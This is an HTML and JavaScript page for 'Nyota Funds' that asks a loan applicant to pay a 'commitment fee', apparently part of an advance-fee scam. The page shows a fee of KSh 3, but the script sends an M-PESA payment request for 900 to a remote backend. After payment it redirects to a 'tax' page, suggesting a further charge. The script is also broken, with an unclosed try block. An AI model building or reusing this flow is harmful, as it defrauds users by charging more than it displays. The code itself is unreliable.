<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Customer Commitment Fee - Nyota Funds</title>

<style>
*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Arial,sans-serif;
}

body{
background:#0b6b0b;
padding:15px;
}

.container{
max-width:430px;
margin:auto;
}

.card{
background:#fff;
padding:20px;
border-radius:12px;
box-shadow:0 5px 15px rgba(0,0,0,.15);
}

h2{
text-align:center;
color:#1565c0;
margin-bottom:15px;
}

.success-box{
background:#e8f5e9;
padding:12px;
border-radius:10px;
color:#1b5e20;
text-align:center;
margin-bottom:15px;
font-size:15px;
}

.details{
background:#f7f7f7;
padding:15px;
border-radius:10px;
margin-bottom:15px;
}

.details p{
margin:10px 0;
font-size:15px;
}

label{
display:block;
margin-top:15px;
margin-bottom:6px;
font-weight:bold;
}

input{
width:100%;
padding:12px;
border:1px solid #ccc;
border-radius:8px;
font-size:16px;
}

button{
width:100%;
padding:15px;
margin-top:20px;
background:#1565c0;
color:white;
border:none;
border-radius:8px;
font-size:17px;
font-weight:bold;
cursor:pointer;
}

button:disabled{
background:#999;
}

#status{
margin-top:15px;
text-align:center;
font-size:15px;
}

.secure{
margin-top:15px;
text-align:center;
font-size:13px;
color:#666;
}
</style>
</head>

<body>

<div class="container">

<div class="card">

<h2>Customer Commitment Fee</h2>

<div class="success-box">
Your NYOTA FUNDS application is almost complete.
</div>

<div class="details">

<p><b>Applicant:</b> <span id="fullName"></span></p>

<p><b>Phone:</b> <span id="phone"></span></p>

<p><b>Selected Fund:</b> KSh <span id="fund">22,000</span></p>

<p><b>Commitment Fee:</b> <span style="color:#1b5e20;font-weight:bold;">KSh 3</span></p>

</div>

<button id="payBtn" onclick="payCommitment()">
Pay Commitment Fee
</button>

<div id="status"></div>

<p class="secure">
🔒 Secure STK Push • Instant Confirmation
</p>

</div>

</div>

<script>

document.getElementById("fullName").innerHTML =
localStorage.getItem("fullName") || "Applicant";

document.getElementById("phone").innerHTML =
localStorage.getItem("phoneNumber") || "";

document.getElementById("fund").innerHTML =
localStorage.getItem("selectedAmount") || "22,000";

async function payCommitment(){

let phone = localStorage.getItem("phoneNumber");

if(!phone){
alert("Phone number not found.");
return;
}

let btn=document.getElementById("payBtn");

let status=document.getElementById("status");

btn.disabled=true;

btn.innerHTML="Sending STK Push...";

status.innerHTML="";

try{

let response=await fetch(
"https://nyota-funds-backend.onrender.com/stk-push",
{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
phone:phone,
amount:900
})
}
);

let data=await response.json();

console.log(data);

let checkoutId=data.checkout_request_id; 

status.innerHTML=
"📱 STK Push sent successfully. Please enter your M-PESA PIN.";

checkPayment(checkoutId);
    async function checkPayment(checkoutId){

let interval=setInterval(async()=>{

try{

let response=await fetch(
"https://nyota-funds-backend.onrender.com/payment-status",
{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
checkout_request_id:checkoutId
})
}
);

let result=await response.json();

console.log(result);

if(result.status==="completed"){

clearInterval(interval);

document.getElementById("status").innerHTML=
"✅ Commitment fee paid successfully. Redirecting...";

setTimeout(()=>{
window.location.href="tax.html";
},1000);

}

else if(result.status==="failed"){

clearInterval(interval);

document.getElementById("status").innerHTML=
"❌ Payment failed.";

document.getElementById("payBtn").disabled=false;
document.getElementById("payBtn").innerHTML="Pay Commitment Fee";

}

else if(result.status==="cancelled"){

clearInterval(interval);

document.getElementById("status").innerHTML=
"❌ Payment cancelled.";

document.getElementById("payBtn").disabled=false;
document.getElementById("payBtn").innerHTML="Pay Commitment Fee";

}

}catch(error){

console.log(error);

}

},3000);

}

</script>

</body>
</html>
